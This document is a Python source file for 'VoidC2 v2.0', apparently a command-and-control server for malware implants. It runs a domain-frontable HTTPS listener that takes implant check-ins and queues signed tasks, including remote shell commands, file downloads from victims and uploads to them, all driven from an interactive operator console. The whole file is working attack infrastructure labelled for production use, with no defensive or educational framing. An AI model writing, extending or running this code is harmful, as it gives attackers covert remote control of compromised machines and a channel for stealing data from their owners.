#!/usr/bin/env python3
# VoidC2 v2.0 – Production HTTPS Listener (domain frontable)
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl, json, base64, threading, hmac, hashlib, os
from datetime import datetime

KEY = b"supersecret128bitkey!!"
sessions = {}
task_queue = {}

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        path = self.path
        length = int(self.headers.get('content-length', 0))
        body = self.rfile.read(length) if length else b""

        if path == "/checkin":
            self.send_response(200)
            self.end_headers()
            return

        if path == "/task":
            client_id = self.headers.get("X-ID", "unknown")
            if client_id not in sessions:
                sessions[client_id] = {"last_seen": datetime.now(), "tasks": []}
            if client_id in task_queue and task_queue[client_id]:
                task = task_queue[client_id].pop(0)
                task_raw = json.dumps(task).encode()
                self.send_response(200)
                self.send_header("X-Signature", sign(task_raw))
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(task_raw)
            else:
                self.send_response(204)
                self.end_headers()

        elif path == "/report":
            report = json.loads(body)
            print(f"\n[{datetime.now()}] Result from {report['id']}:")
            print(report["result"].get("output", report["result"]))
            self.send_response(200)
            self.end_headers()

    def log_message(*args): pass

def sign(data): 
    return base64.b64encode(hmac.new(KEY, data, hashlib.sha256).digest()).decode()

def queue_task(client_id, cmd, **kwargs):
    task = {"id": hashlib.sha1(os.urandom(8)).hexdigest(), "cmd": cmd, **kwargs}
    task_queue.setdefault(client_id, []).append(task)
    print(f"[+] Task queued for {client_id}")

# ==== Interactive Console ====
def console():
    while True:
        try:
            cmd = input("\nvoidc2> ")
            if cmd == "list":
                for sid, info in sessions.items():
                    print(f"{sid} -> {info['last_seen']}")
            elif cmd.startswith("target "):
                global target
                target = cmd.split()[1]
                print(f"Target set to {target}")
            elif cmd:
                if 'target' not in globals():
                    print("Set target first")
                    continue
                if cmd.startswith("download "):
                    queue_task(target, "download", path=cmd[9:])
                elif cmd.startswith("upload "):
                    path, local = cmd[7:].split()[0], cmd[7:].split()[1]
                    queue_task(target, "upload", path=path, 
                              data=base64.b64encode(open(local,"rb").read()).decode())
                else:
                    queue_task(target, "shell", args=cmd)
        except:
            pass

# ==== Start Server ====
threading.Thread(target=console, daemon=True).start()
httpd = HTTPServer(('0.0.0.0', 443), Handler)
httpd.socket = ssl.wrap_socket(httpd.socket,
                               certfile='fullchain.pem',   # Let's Encrypt
                               keyfile='privkey.pem', server_side=True)
print("[*] VoidC2 Production Server running on HTTPS :443 (domain frontable)")
httpd.serve_forever()
